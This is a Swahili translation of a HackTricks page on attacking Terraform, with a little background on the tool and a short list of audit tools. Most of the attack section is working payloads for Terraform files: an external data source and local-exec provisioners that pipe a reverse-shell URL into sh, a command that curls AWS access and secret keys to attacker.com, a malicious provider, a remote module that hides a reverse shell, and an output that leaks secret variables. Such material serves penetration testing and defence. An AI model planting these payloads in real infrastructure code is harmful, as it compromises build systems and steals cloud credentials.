# Usalama wa Terraform

<details>

<summary><strong>Jifunze kuhusu kudukua AWS kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Mtaalam wa Timu Nyekundu ya AWS ya HackTricks)</strong></a><strong>!</strong></summary>

Njia nyingine za kusaidia HackTricks:

* Ikiwa unataka kuona **kampuni yako ikionekana kwenye HackTricks** au **kupakua HackTricks kwa PDF** Angalia [**MIPANGO YA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
* Pata [**bidhaa rasmi za PEASS & HackTricks**](https://peass.creator-spring.com)
* Gundua [**Familia ya PEASS**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) ya kipekee
* **Jiunge na** üí¨ [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au kikundi cha [**telegram**](https://t.me/peass) au **nifuata** kwenye **Twitter** üê¶ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Shiriki mbinu zako za kudukua kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.

</details>

## Taarifa Msingi

[Kutoka kwa nyaraka: ](https://developer.hashicorp.com/terraform/intro)

HashiCorp Terraform ni chombo cha **infrastructure as code** kinachokuwezesha kufafanua **rasilimali za wingu na za ndani** katika faili za usanidi zinazoweza kusomwa na binadamu ambazo unaweza kuhifadhi kwa toleo, kutumia tena, na kushiriki. Kisha unaweza kutumia mchakato thabiti kutoa na kusimamia miundombinu yako yote kwa njia yake ya maisha. Terraform inaweza kusimamia vipengele vya kiwango cha chini kama vile kompyuta, uhifadhi, na rasilimali za mtandao, pamoja na vipengele vya kiwango cha juu kama vile kuingia kwa DNS na huduma za SaaS.

### Terraform Inafanyaje Kazi?

Terraform inaunda na kusimamia rasilimali kwenye majukwaa ya wingu na huduma zingine kupitia interfaces zao za programu (APIs). Watoa huduma huwezesha Terraform kufanya kazi na karibu jukwaa au huduma yoyote yenye API inayopatikana.

HashiCorp na jamii ya Terraform tayari wameandika **zaidi ya watoa huduma 1700** kusimamia aina tofauti maelfu ya rasilimali na huduma, na idadi hii inaendelea kuongezeka. Unaweza kupata watoa huduma wote wanaopatikana hadharani kwenye [Usajili wa Terraform](https://registry.terraform.io/), ikiwa ni pamoja na Amazon Web Services (AWS), Azure, Google Cloud Platform (GCP), Kubernetes, Helm, GitHub, Splunk, DataDog, na mengi zaidi.

Mchakato msingi wa Terraform unajumuisha hatua tatu:

* **Andika:** Unafafanua rasilimali, ambazo zinaweza kuwa kwenye watoa huduma na huduma nyingi. Kwa mfano, unaweza kuunda usanidi wa kupeleka programu kwenye mashine za vitu vya kubadilishana katika mtandao wa Virtual Private Cloud (VPC) na vikundi vya usalama na balansa ya mzigo.
* **Panga:** Terraform inaunda mpango wa utekelezaji unaelezea miundombinu itakayoundwa, kusasishwa, au kuharibiwa kulingana na miundombinu iliyopo na usanidi wako.
* **Tumia:** Kwa idhini, Terraform hutekeleza shughuli zilizopendekezwa kwa mpangilio sahihi, kuheshimu mitegemeo yoyote ya rasilimali. Kwa mfano, ikiwa unasasisha mali ya VPC na kubadilisha idadi ya mashine za vitu katika VPC hiyo, Terraform itaunda upya VPC kabla ya kupanua mashine za vitu.

## Maabara ya Terraform

Tuweke tu terraform kwenye kompyuta yako.

Hapa una [mwongozo](https://learn.hashicorp.com/tutorials/terraform/install-cli) na hapa una [njia bora ya kupakua terraform](https://www.terraform.io/downloads).

## RCE katika Terraform

Terraform **haina jukwaa linalofunua ukurasa wa wavuti au huduma ya mtandao** tunayoweza kuchunguza, kwa hivyo, njia pekee ya kudukua terraform ni **kuweza kuongeza/kurekebisha faili za usanidi wa terraform**.

Hata hivyo, terraform ni **sehemu nyeti sana** ya kudukua kwa sababu itakuwa na **upatikanaji wa haki za kipekee** kwa maeneo tofauti ili iweze kufanya kazi vizuri.

Njia kuu kwa mshambuliaji kuweza kudukua mfumo ambapo terraform inaendeshwa ni **kudukua hazina inayohifadhi mizizi ya usanidi wa terraform**, kwa sababu wakati fulani ita **tafsiriwa**.

Kwa kweli, kuna suluhisho huko nje ambazo **hutekeleza terraform plan/apply moja kwa moja baada ya PR** kuundwa, kama vile **Atlantis**:

{% content-ref url="atlantis-security.md" %}
[atlantis-security.md](atlantis-security.md)
{% endcontent-ref %}

Ikiwa unaweza kudukua faili ya terraform kuna njia tofauti unaweza kufanya RCE wakati mtu anatekeleza `terraform plan` au `terraform apply`.

### Terraform plan

Terraform plan ni **amri inayotumiwa zaidi** katika terraform na waendelezaji/suluhisho zinazotumia terraform huita mara kwa mara, kwa hivyo **njia rahisi ya kupata RCE** ni kuhakikisha unachafua faili ya usanidi wa terraform ambayo itatekeleza amri za kiholela katika `terraform plan`.

#### Kutumia mtoa huduma wa nje

Terraform inatoa [`mtoa huduma wa nje`](https://registry.terraform.io/providers/hashicorp/external/latest/docs) ambao hutoa njia ya kuingiliana kati ya Terraform na programu za nje. Unaweza kutumia chanzo cha data cha `external` kutekeleza nambari ya kiholela wakati wa `plan`.

Kuweka kitu kama hicho katika faili ya usanidi wa terraform kutatekeleza rev shell wakati wa kutekeleza `terraform plan`:
```javascript
data "external" "example" {
program = ["sh", "-c", "curl https://reverse-shell.sh/8.tcp.ngrok.io:12946 | sh"]
}
```
#### Kutumia mtoa huduma ya desturi

Mshambuliaji anaweza kutuma [mtoa huduma ya desturi](https://learn.hashicorp.com/tutorials/terraform/provider-setup) kwenye [Usajili wa Terraform](https://registry.terraform.io/) na kisha kuongeza kwenye nambari ya Terraform kwenye tawi la kipengele ([mfano kutoka hapa](https://alex.kaskaso.li/post/terraform-plan-rce)):
```javascript
terraform {
required_providers {
evil = {
source  = "evil/evil"
version = "1.0"
}
}
}

provider "evil" {}
```
Provider hupakuliwa katika `init` na itaendesha nambari yenye nia mbaya wakati `plan` inatekelezwa

Unaweza kupata mfano katika [https://github.com/rung/terraform-provider-cmdexec](https://github.com/rung/terraform-provider-cmdexec)

#### Kutumia kumbukumbu ya nje

Chaguo zote zilizotajwa ni muhimu lakini sio sana kwa siri (ya pili ni siri zaidi lakini ngumu zaidi kuliko ya kwanza). Unaweza kufanya shambulizi hili hata kwa njia **ya siri zaidi**, kwa kufuata mapendekezo haya:

* Badala ya kuongeza rev shell moja kwa moja kwenye faili ya terraform, unaweza **kupakia rasilimali ya nje** inayohifadhi rev shell:
```javascript
module "not_rev_shell" {
source = "git@github.com:carlospolop/terraform_external_module_rev_shell//modules"
}
```
Unaweza kupata msimbo wa rev shell katika [https://github.com/carlospolop/terraform\_external\_module\_rev\_shell/tree/main/modules](https://github.com/carlospolop/terraform\_external\_module\_rev\_shell/tree/main/modules)

* Katika rasilimali ya nje, tumia kipengele cha **ref** kuficha **msimbo wa rev shell wa terraform katika tawi** ndani ya repo, kitu kama: `git@github.com:carlospolop/terraform_external_module_rev_shell//modules?ref=b401d2b`

### Kutumia Terraform

Terraform apply itatekelezwa ili kutumia mabadiliko yote, unaweza pia kuitumia vibaya kupata RCE kwa kuingiza **faili ya Terraform yenye nia mbaya** na [**local-exec**](https://www.terraform.io/docs/provisioners/local-exec.html)**.**\
Unahitaji tu kuhakikisha kuwa mzigo kama huu unamalizia katika faili ya `main.tf`:
```json
// Payload 1 to just steal a secret
resource "null_resource" "secret_stealer" {
provisioner "local-exec" {
command = "curl https://attacker.com?access_key=$AWS_ACCESS_KEY&secret=$AWS_SECRET_KEY"
}
}

// Payload 2 to get a rev shell
resource "null_resource" "rev_shell" {
provisioner "local-exec" {
command = "sh -c 'curl https://reverse-shell.sh/8.tcp.ngrok.io:12946 | sh'"
}
}
```
Fuata **mapendekezo kutoka kwa mbinu iliyopita** kufanya shambulizi hili kwa njia **ya kisiri zaidi kwa kutumia vyanzo vya nje**.

## Kupitisha Siri

Unaweza kuwa na **thamani za siri zilizotumiwa na terraform zilizomwagika** kwa kukimbia `terraform apply` kwa kuongeza kitu kwenye faili ya terraform kama ifuatavyo:
```json
output "dotoken" {
value = nonsensitive(var.do_token)
}
```
## Zana za Ukaguzi

* [**tfsec**](https://github.com/aquasecurity/tfsec): tfsec hutumia uchambuzi wa nambari yako ya terraform ili kugundua upangaji mbaya unaoweza kutokea.
* [**terascan**](https://github.com/tenable/terrascan): Terrascan ni mtambulishaji wa nambari ya static kwa Miundombinu kama Nambari.

## Marejeo

* [Atlantis Security](atlantis-security.md)
* [https://alex.kaskaso.li/post/terraform-plan-rce](https://alex.kaskaso.li/post/terraform-plan-rce)
* [https://developer.hashicorp.com/terraform/intro](https://developer.hashicorp.com/terraform/intro)


<details>

<summary><strong>Jifunze kuhusu kudukua AWS kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Mtaalam wa Timu Nyekundu ya AWS ya HackTricks)</strong></a><strong>!</strong></summary>

Njia nyingine za kusaidia HackTricks:

* Ikiwa unataka kuona **kampuni yako ikitangazwa kwenye HackTricks** au **kupakua HackTricks kwa PDF** Angalia [**MIPANGO YA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
* Pata [**bidhaa rasmi za PEASS & HackTricks**](https://peass.creator-spring.com)
* Gundua [**Familia ya PEASS**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) ya kipekee
* **Jiunge na** üí¨ [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au kikundi cha [**telegram**](https://t.me/peass) au **nifuata** kwenye **Twitter** üê¶ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Shiriki mbinu zako za kudukua kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.

</details>
